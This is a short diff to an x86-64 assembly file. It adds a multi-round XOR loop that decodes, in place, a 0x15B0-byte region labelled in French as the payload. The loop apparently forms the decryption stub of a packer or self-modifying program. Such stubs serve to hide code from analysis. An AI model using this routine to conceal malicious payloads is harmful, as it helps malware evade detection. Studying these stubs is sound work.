@@ -1,6 +1,30 @@
 global ft_end
 
 ft_end:
+mov r9, 8 ; NB_TIMING MOODULABLE
+loop2:
+	xor edx, edx
+	mov eax, 0x15B0 ; taille du payload
+	mov ecx, 4
+	div ecx
+	mul ecx
+	mov ecx, eax
+	sub ecx, DWORD 4
+	mov rdi, rbx ; debut du payload
+	sub r15, r14
+	cld
+loop1:
+	mov eax, DWORD [rdi]
+	xor rax, r15
+	stosd
+	add r15d, DWORD [rdi - 4]
+ 	sub ecx, 4
+	cmp ecx, 0
+	jg loop1
+	dec r9
+	test r9, r9
+	jne loop2
+end:
 	pop r15
 	pop r15
 	pop r14
